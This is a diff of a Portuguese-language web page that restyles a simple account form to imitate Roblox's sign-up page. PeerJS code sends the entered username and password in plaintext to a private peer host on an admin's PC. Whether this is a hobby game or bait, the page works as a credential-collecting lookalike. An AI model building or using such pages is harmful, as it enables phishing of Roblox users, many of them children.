@@ -1,14 +1,186 @@
-<h2>Criar Conta Roblox P2P</h2>
-<input type="text" id="user" placeholder="Usuário">
-<input type="password" id="pass" placeholder="Senha">
-<button onclick="salvar()">Criar Conta</button>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Cadastrar-se</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body {
+            background-color: #F2F4F5;
+            font-family: 'HCo Gotham SSm', "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-<script>
-function salvar() {
-    const u = document.getElementById("user").value;
-    const p = document.getElementById("pass").value;
-    localStorage.setItem("conta", JSON.stringify({usuario: u, senha: p}));
-    alert("Conta criada no navegador!");
-    window.location.href = "menu.html";
-}
-</script>
+        /* Barra de Navegação Falsa */
+        .nav-falsa {
+            width: 100%;
+            height: 40px;
+            background-color: #fff;
+            border-bottom: 1px solid #ced4da;
+            margin-bottom: 20px;
+        }
+
+        .main-container {
+            background: #ffffff;
+            width: 90%;
+            max-width: 400px;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        h2 { color: #393b3d; font-size: 22px; margin-bottom: 20px; }
+
+        label {
+            display: block;
+            text-align: left;
+            font-size: 12px;
+            font-weight: bold;
+            color: #393b3d;
+            margin-bottom: 5px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ced4da;
+            border-radius: 3px;
+            background-color: #F2F4F5;
+            box-sizing: border-box;
+        }
+
+        .gender-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .gender-btn {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ced4da;
+            background: #fff;
+            cursor: pointer;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+
+        .gender-btn:hover { background: #eee; }
+
+        .btn-signup {
+            background-color: #00B06F;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-signup:hover { background-color: #008554; }
+
+        #status-p2p {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #888;
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #666;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="nav-falsa"></div>
+
+    <div class="main-container">
+        <h2>Cadastrar-se e comece a se divertir!</h2>
+        
+        <label>DATA DE NASCIMENTO</label>
+        <div style="display: flex; gap: 5px;">
+            <select id="dia"><option>Dia</option></select>
+            <select id="mes"><option>Mês</option></select>
+            <select id="ano"><option>Ano</option></select>
+        </div>
+
+        <label>USUÁRIO</label>
+        <input type="text" id="user" placeholder="Não use seu nome real">
+
+        <label>SENHA</label>
+        <input type="password" id="pass" placeholder="Mínimo de 8 caracteres">
+
+        <label>GÊNERO (OPCIONAL)</label>
+        <div class="gender-container">
+            <button class="gender-btn" onclick="setGender('Feminino')">👩</button>
+            <button class="gender-btn" onclick="setGender('Masculino')">👨</button>
+        </div>
+
+        <p class="footer-text">
+            Ao clicar em Cadastrar-se, você aceita os Termos de Uso e a Política de Privacidade.
+        </p>
+
+        <button class="btn-signup" onclick="enviarParaHost()">Cadastrar-se</button>
+
+        <p id="status-p2p">Conectando ao servidor...</p>
+    </div>
+
+    <script>
+        let generoSelecionado = "Não informado";
+        function setGender(g) { generoSelecionado = g; alert("Gênero selecionado: " + g); }
+
+        // Preencher selects de data (apenas visual)
+        for(let i=1; i<=31; i++) document.getElementById('dia').innerHTML += `<option>${i}</option>`;
+        const meses = ["Jan", "Fev", "Mar", "Abr", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"];
+        meses.forEach(m => document.getElementById('mes').innerHTML += `<option>${m}</option>`);
+
+        // Lógica P2P
+        const peer = new Peer();
+        const ID_DO_SERVIDOR = "MEU_ROBLOX_HOST_PRIVADO_2026";
+        let conexao;
+
+        peer.on('open', () => {
+            document.getElementById('status-p2p').innerText = "Sistema P2P Pronto";
+            conexao = peer.connect(ID_DO_SERVIDOR);
+        });
+
+        function enviarParaHost() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            if(user.length < 3 || pass.length < 4) {
+                alert("Preencha os campos corretamente!");
+                return;
+            }
+
+            if(conexao && conexao.open) {
+                conexao.send({
+                    tipo: "CADASTRO",
+                    usuario: user,
+                    senha: pass,
+                    genero: generoSelecionado,
+                    data: document.getElementById('dia').value + "/" + document.getElementById('mes').value
+                });
+                
+                localStorage.setItem('meu_user', user);
+                alert("Cadastro realizado!");
+                window.location.href = "menu.html";
+            } else {
+                alert("O servidor está offline no PC do admin!");
+            }
+        }
+    </script>
+</body>
+</html>
